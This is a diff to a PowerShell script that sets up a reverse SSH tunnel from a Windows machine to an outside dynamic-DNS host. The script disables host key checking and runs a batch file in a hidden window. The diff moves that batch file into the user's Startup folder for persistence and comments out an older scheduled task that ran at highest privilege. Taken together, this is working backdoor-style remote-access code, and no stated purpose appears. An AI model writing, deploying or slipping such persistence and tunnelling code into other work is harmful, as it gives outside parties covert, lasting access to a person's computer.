@@ -39,7 +39,8 @@ $remote_host = "edcoretecmm.sytes.net"
 $receivedPort = 2004
 $neutralPath = "C:\ProgramData\revssh"
 $logFile = "$neutralPath\rev_ssh.log"
-$batFilePath = "$neutralPath\rev_ssh.bat"
+#$batFilePath = "$neutralPath\rev_ssh.bat"
+$batFilePath = "C:\Users\$username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\rev_ssh.bat"
 
 # Create C:\ProgramData\revssh if it doesn't exist
 if (-not (Test-Path $neutralPath)) {
@@ -141,7 +142,7 @@ ssh -o "StrictHostKeyChecking=no" -i $keyFile $user@$remote_host "mkdir -p ~/.ss
 $batContent = @"
 @echo off
 echo [INFO] Starting reverse SSH tunnel at %date% %time% by %USERNAME% using "$receivedPort" >> "$logFile"
-timeout /t 10 /nobreak > nul
+timeout /t 30 /nobreak > nul
 "C:\Windows\System32\OpenSSH\ssh.exe" -o "StrictHostKeyChecking=no" -o "ExitOnForwardFailure=yes" -i "$keyFile" -N -f -R ${receivedPort}:127.0.0.1:22 ${user}@${remote_host} >> "$logFile" 2>&1
 if %ERRORLEVEL% EQU 0 (
     echo [SUCCESS] SSH tunnel established successfully at %date% %time% >> "$logFile"
@@ -158,30 +159,30 @@ Start-Process -FilePath "$batFilePath" -WindowStyle Hidden
 #Start-Process -FilePath "$batFilePath"
 
 
-$taskName = "ReverseSSHTunnel"
+#$taskName = "ReverseSSHTunnel"
 
 # Define the action to run the reverse SSH tunnel batch file
-$action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c `"$batFilePath`""
+#$action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c `"$batFilePath`""
 
 # Remove the task if it already exists
-if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {
-    Unregister-ScheduledTask -TaskName $taskName -Confirm:$false
-}
+#if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {
+#    Unregister-ScheduledTask -TaskName $taskName -Confirm:$false
+#}
 
 # Schedule the task
-$trigger = New-ScheduledTaskTrigger -AtStartup
+#$trigger = New-ScheduledTaskTrigger -AtStartup
 # Set ExecutionTimeLimit to zero to indicate no time limit
-$settings = New-ScheduledTaskSettingsSet `
-    -StartWhenAvailable `
-    -AllowStartIfOnBatteries `
-    -DontStopIfGoingOnBatteries `
-    -ExecutionTimeLimit ([TimeSpan]::Zero)
+#$settings = New-ScheduledTaskSettingsSet `
+#    -StartWhenAvailable `
+#    -AllowStartIfOnBatteries `
+#    -DontStopIfGoingOnBatteries `
+#    -ExecutionTimeLimit ([TimeSpan]::Zero)
 
-Register-ScheduledTask -TaskName $taskName `
-    -Trigger $trigger `
-    -Action $action `
-    -Settings $settings `
-    -RunLevel Highest `
-    -User $username
+#Register-ScheduledTask -TaskName $taskName `
+#    -Trigger $trigger `
+#    -Action $action `
+#    -Settings $settings `
+#    -RunLevel Highest `
+#    -User $username
 
 Write-Host "`n[!] Success! SSH reverse tunnel batch file created and scheduled. Path: $batFilePath."
